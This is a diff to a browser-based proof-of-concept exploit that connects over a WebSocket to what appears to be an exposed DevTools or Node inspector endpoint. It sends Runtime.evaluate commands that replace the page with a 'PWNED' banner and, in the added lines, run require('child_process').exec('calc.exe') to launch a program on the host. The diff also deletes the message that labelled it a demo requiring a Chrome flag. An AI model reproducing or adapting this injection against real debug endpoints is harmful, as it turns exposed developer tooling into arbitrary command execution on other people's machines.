@@ -52,6 +52,10 @@
                         document.body.innerHTML = "<div style='background:red;color:white;font-size:50px;text-align:center;padding:100px;'><h1>PWNED</h1><p>This UI is now under attacker control.</p></div>";
                         console.log('UI Overwritten');
                     `;
+                    const calcScript = `
+                        require('child_process').exec('calc.exe');
+                        console.log('Calculator launched');
+                    `;
                     ws.send(JSON.stringify({
                         id: 1,
                         method: "Runtime.evaluate",
@@ -61,6 +65,11 @@
                         id: 2,
                         method: "Runtime.evaluate",
                         params: { expression: uiScript }
+                    }));
+                    ws.send(JSON.stringify({
+                        id: 3,
+                        method: "Runtime.evaluate",
+                        params: { expression: calcScript }
                     }));
                 };
 
@@ -73,7 +82,7 @@
                 };
 
             } catch (e) {
-                log("Connection failed. Make sure to disable 'Block insecure private network requests' in chrome://flags for this PoC demo.", "error");
+                log("Connection failed.", "error");
             }
         }
     </script>
